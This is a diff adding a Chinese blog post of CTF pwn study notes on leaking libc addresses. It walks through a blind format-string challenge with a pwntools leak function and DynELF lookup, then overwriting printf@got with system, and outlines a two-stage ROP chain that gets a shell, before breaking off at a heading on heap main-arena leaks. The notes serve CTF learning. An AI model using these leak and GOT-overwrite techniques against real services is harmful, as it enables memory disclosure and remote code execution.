@@ -1,0 +1,42 @@
+---
+title: "libc泄漏"
+date: 2021-11-10T12:35:39+08:00
+draft: false
+tags: ['ctf', 'pwn']
+categories: ['learning']
+---
+
+libc泄漏在pwn题里很常见，在这里整理一下常见的泄漏libc的方法。
+ROP中的ret2libc需要知道libc的版本和偏移，需要泄漏内存中函数的地址。
+fmtstr中有时需要知道libc的偏移后用system函数覆盖某些函数的got。
+堆利用中也会有用system覆盖函数got的利用方式。
+
+* 格式化字符串漏洞
+** NJCTF2017 [[https://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.2_pwn_njctf2017_pingme.md][pingme]]
+这题是blind fmt，只提供了ip和端口。在从内存dump下代码后搜索到printf@got，泄漏出printf地址。用泄漏的printf地址搜索libc-database得到libc版本后在libc中搜到system，用system和printf的相对地址转化得到system在进程中的地址。然后利用fmtstring用system覆盖printf@got。
+如果libc-database搜不到，可以用DynELF来泄漏system地址。
+
+#+begin_src python
+def leak(addr):
+    p = remote('127.0.0.1', '10001')
+    p.recvline()
+    payload = "%9$s.AAA" + p32(addr)
+    p.sendline(payload)
+    data = p.recvuntil(".AAA")[:-4] + "\x00"
+    log.info("leaking: 0x%x --> %s" % (addr, data.encode('hex')))
+    p.close()
+    return data
+data = DynELF(leak, 0x08048490)     # Entry point address
+system_addr = data.lookup('system', 'libc')
+printf_addr = data.lookup('printf', 'libc')
+log.info("system address: 0x%x" % system_addr)
+log.info("printf address: 0x%x" % printf_addr)
+#+end_src
+
+DynELF 不要求我们拿到 libc.so，所以如果我们查询不到 libc.so 的版本信息，该模块就能发挥它最大的作用  。
+* ROP
+** geekgame-0th [[https://github.com/PKU-GeekGame/geekgame-0th/blob/main/writeups/wp-xmcp/wp-xmcp.md][庄子的回文]]
+这题需要利用ropchain打印出任意函数的got，计算出libc的偏移后回到函数执行入口，再次执行rop，用ropchain构造system("/bin/sh")就可以得到shell。第一次打印出函数got的ropchain是用目标elf文件中指令构造的，拿到libcbase后才能用libc中的指令构造第二次rop。这题要用两次rop是因为原elf文件不能直接构造出system("/bin/sh").
+* main arena
+** 字符串非'\x00'结尾
+*** HITBCTF2018 [[https://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.2_pwn_njctf2017_pingme.md][gundam]]
